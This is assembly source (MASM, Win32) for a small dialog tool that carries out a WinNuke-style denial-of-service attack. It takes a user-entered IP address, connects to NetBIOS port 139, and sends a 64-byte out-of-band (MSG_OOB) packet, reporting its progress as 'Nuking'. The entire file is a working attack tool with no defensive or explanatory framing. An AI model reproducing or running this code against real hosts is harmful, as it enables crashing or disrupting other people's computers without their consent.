.686
.model	flat, stdcall
option	casemap :none

include windows.inc
include kernel32.inc
include user32.inc
include Comctl32.inc
include shell32.inc
include wsock32.inc

includelib kernel32.lib
includelib user32.lib
includelib Comctl32.lib
includelib shell32.lib
includelib wsock32.lib


CTEXT MACRO y:VARARG
LOCAL sym, dummy
dummy EQU $;; MASM error fix
CONST segment
IFIDNI <y>,<>
sym db 0
ELSE
sym db y,0
ENDIF
CONST ends
EXITM <OFFSET sym>
ENDM

DlgProc		PROTO	:DWORD,:DWORD,:DWORD,:DWORD

.const
IDD_MAIN	equ	1000
IDB_NUKEIT	equ	1001

.data?
		hInstance	dd	?
		IPAddress  	db 18 dup(?)
		TheMsg  	db 64 dup(?)
		buffer     	db 128 dup(?)
		sin        	sockaddr_in <?>
		wsadata		WSADATA <?>
		sock       	dd ?

.code
start:
	invoke	GetModuleHandle, NULL
	mov	hInstance, eax
	invoke	InitCommonControls
	invoke	DialogBoxParam, hInstance, IDD_MAIN, 0, offset DlgProc, 0
	invoke	ExitProcess, eax

DlgProc proc hWin:DWORD,uMsg:DWORD,wParam:DWORD,lParam:DWORD
	mov	eax,uMsg
	
	.if	eax == WM_INITDIALOG
		invoke	LoadIcon,hInstance,200
		invoke	SendMessage, hWin, WM_SETICON, 1, eax
	.elseif eax == WM_COMMAND
		mov	eax,wParam
		.if	eax == IDB_NUKEIT
			invoke SendDlgItemMessage,hWin,1002,WM_GETTEXT,sizeof IPAddress,addr IPAddress
			invoke SendDlgItemMessage,hWin,1008,WM_GETTEXT,sizeof TheMsg,addr TheMsg
					
		@@start:
			invoke WSAStartup, 101h, offset wsadata
			test eax, eax
			jnz @@start
			invoke socket, AF_INET, SOCK_STREAM, 0
			mov sock, eax
			mov sin.sin_family, AF_INET
			invoke htons, 139
			mov sin.sin_port, ax
			invoke inet_addr, addr IPAddress
			mov sin.sin_addr, eax
			
			invoke wsprintf, addr buffer,CTEXT("Status: Finding Host %s"), addr IPAddress
			invoke SendDlgItemMessage,hWin,1005,WM_SETTEXT,0,addr buffer
			invoke Sleep,800
	
			invoke connect, sock, addr sin, sizeof sin
			cmp eax, SOCKET_ERROR
			jz @@connect_err
			invoke wsprintf, addr buffer,CTEXT("Status: Connected to %s:139"), addr IPAddress
			invoke SendDlgItemMessage,hWin,1005,WM_SETTEXT,0,addr buffer
			invoke Sleep,800
				
			invoke send, sock, addr TheMsg, 64, MSG_OOB
			invoke wsprintf, addr buffer,CTEXT("Status: Nuking with %ld bytes"),eax
			invoke SendDlgItemMessage,hWin,1005,WM_SETTEXT,0,addr buffer
			invoke Sleep,1200
			jmp @@err

		@@connect_err:
			invoke wsprintf, addr buffer,CTEXT("Status: Cannot connect to %s:139"), addr IPAddress
			invoke SendDlgItemMessage,hWin,1005,WM_SETTEXT,0,addr buffer
		@@err:
			invoke SendDlgItemMessage,hWin,1005,WM_SETTEXT,0,CTEXT("Status: Closing Socket")
			invoke Sleep,800
			invoke closesocket, sock
			invoke WSACleanup
			invoke SendDlgItemMessage,hWin,1005,WM_SETTEXT,0,CTEXT("Status: Ready...")
		.endif
	.elseif	eax == WM_CLOSE
		invoke	EndDialog, hWin, 0
	.endif

	xor	eax,eax
	ret
DlgProc endp

end start